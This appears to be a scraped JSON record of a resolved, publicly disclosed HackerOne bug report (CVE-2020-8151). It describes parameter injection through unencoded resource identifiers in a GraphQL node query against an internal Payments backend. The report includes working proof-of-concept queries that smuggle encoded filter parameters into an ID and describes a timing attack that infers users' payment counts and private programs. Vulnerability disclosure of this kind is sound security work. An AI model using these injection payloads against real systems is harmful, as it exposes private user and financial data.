@@ -1,0 +1,138 @@
+{
+  "id": 800231,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDAyMzE=",
+  "url": "https://hackerone.com/reports/800231",
+  "title": "GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-02-20T03:25:44.761Z",
+  "submitted_at": "2020-02-20T03:25:44.761Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8151"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-11T17:53:34.131Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-05-11T17:53:33.856Z",
+  "team_member_agreed_on_going_public_at": "2020-05-11T17:48:44.867Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "HackerOne exposes a small number of ActiveResource objects through its GraphQL `node` interface. [ActiveResource](https://github.com/rails/activeresource) objects use HTTP as transport layer in order to fetch data. Four of these models, `TaxForm`, `Payout`, `Payment`, and `PayoutPreference` are fetched from an internal Payments backend system with a REST interface. Due to the lack of encoding the resource identifier, it is possible to inject additional parameters and point a `find` call to a difference resource endpoint.\n\n# Proof of concept\nConsider the following GraphQL query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/1\") {\n    ... on User { \n      id\n    }\n  }\n}\n```\n\n**Note**: it's important to note that the model the node identifier would return does **not** correspond with the expected GraphQL type. This is important for the exploit later in the report. This query would send the following HTTP request to HackerOne's Payments backend:\n\n```\nGET /payments/1 HTTP/1.1\n...\n```\n\nBecause ActiveResource does not have an opinion on identifiers, it won't encode it (e.g. it doesn't raise an exception when a string is passed instead of an integer). This means that the following GraphQL query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/something\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWill result in the following HTTP request:\n\n```\nGET /payments/something HTTP/1.1\n...\n```\n\nBecause the Payments backend uses a REST interface, the `/payments` endpoint can be used to filter by the entire set of `Payment` objects. This particular controller (and corresponding controllers for the other models) have a number of parameters that can be used to filter objects. There are 16 parameters, but the two that we'll use for the exploit:\n\n * core_hacker_username\n * core_team_handle\n\nA global ID (the identifier used in the `node` interface) uses forward slashes to separate the different components (i.e. it's a URI). This means that any URL encoded character in the identifier (last) part of a global ID should be URL encoded and will be decoded when uses. This means that:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/%31\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWill result in:\n\n```\nGET /payments/1.json HTTP/1.1\n...\n```\n\nNow consider the following GraphQL query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWill result in:\n\n```\nGET /payments/?core_hacker_username=jobert&core_team_handle=security%26.json HTTP/1.1\n...\n```\n\n**Note**: the trailing ampersand (`%26`) is used to let the router ignore the appended `.json` extension. The `PaymentsController#index` method will, as expected, return a serialized array of Payment objects that match the given parameters. The timing difference between a response without objects and a response with objects is significant enough to distinguish the two:\n\n| Identifier | Number of objects | RTT |\n| ------ | ------ | ------ |\n| `%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26` | 0 | ~400ms |\n| `%3fcore_hacker_username%3dfransrosen%26core_team_handle%3dsecurity%26` | 2 | ~2000ms |\n\nGoing back to the original query, it can be seen that it'll try to serialize a `User` object. This was necessary because not all ActiveResource models translate to a GraphQL type, such as `Payment`. Because this vulnerability can only be exploited with a timing attack it therefor doesn't matter what the response from the server is. In all cases, the server will respond with a 500 internal server error because the index endpoints of the REST interface will return an array, while the code expects a single record to be returned.\n\nBecause HackerOne exposes a sitemap with programs and user handles (and their ID), it would be rather straightforward to enumerate these and determine the information shown in the impact section of this report.\n\n# Preliminary hypothesis on root cause\nIt's rather unexpected that the ActiveResource gem does not encode the resource identifier before using it in the path of an HTTP request. This behavior is also not documented from our initial investigation. Given the identifiers shown above, the expectation would be that this query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/%3fsomething%26\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWould result in:\n\n```\nGET /payments/%3fsomething%26.json HTTP/1.1\n...\n```\n\nHowever, as described earlier, it results in:\n\n```\nGET /payments/?something&.json HTTP/1.1\n...\n```\n\nThe current thinking is that the ActiveResource gem should properly (re)encode the resource identifier before making the HTTP request.\n\n## Impact\n\nThe timing attack can be used to determine the following information:\n\n* roughly how many payments a user has received (not the amount, only total count!)\n* the existence of a private bug bounty program\n* the type of tax form a user has signed\n* the default payout preference type of a user",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-06-10T17:48:44.952Z",
+  "allow_singular_disclosure_after": -185933346.24264985,
+  "singular_disclosure_allowed": true,
+  "vote_count": 42,
+  "voters": [
+    "nikitastupin",
+    "sameerphad72",
+    "zeroxyele",
+    "eye_",
+    "macasun",
+    "samet",
+    "naategh",
+    "0xwise",
+    "haxta4ok00",
+    "what_web",
+    "and 32 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
